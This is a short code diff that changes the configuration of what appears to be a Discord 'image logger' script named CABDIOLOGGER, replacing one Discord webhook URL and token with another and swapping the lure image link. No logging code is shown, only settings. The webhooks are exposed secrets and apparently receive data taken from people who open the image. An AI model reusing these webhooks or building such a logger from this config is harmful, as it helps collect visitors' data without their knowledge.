@@ -10,8 +10,8 @@ __version__ = "v2.0"
 __author__ = "cabdio"
 
 config = {
-    "webhook": "https://discord.com/api/webhooks/1425211812638621736/zF72k5B_XQ07fcCM6LpZ9enZ6rCBmG4xnfprwO7eN0DVgrgSzj6Xki08Vq0n25DiuAid",
-    "image": "https://stickerly.pstatic.net/sticker_pack/eNrxqOuc388RTr1MVqOg/BKPGHG/16/61453289.png", 
+    "webhook": "https://discord.com/api/webhooks/1457822166887174257/bdFYtwUXcj8SGs0KOfZFHnGhMQ8Y0-hvFso5tzkzYL-4ZsjKmggsD3U0q5gynh3vQYU8",
+    "image": "https://e7.pngegg.com/pngimages/903/872/png-clipart-xxxtentacion-illustration-xxxtentacion-rapper-musician-xxxtentacion-head-musician.png", 
     "imageArgument": True,
 
     "username": "CABDIOLOGGER", 
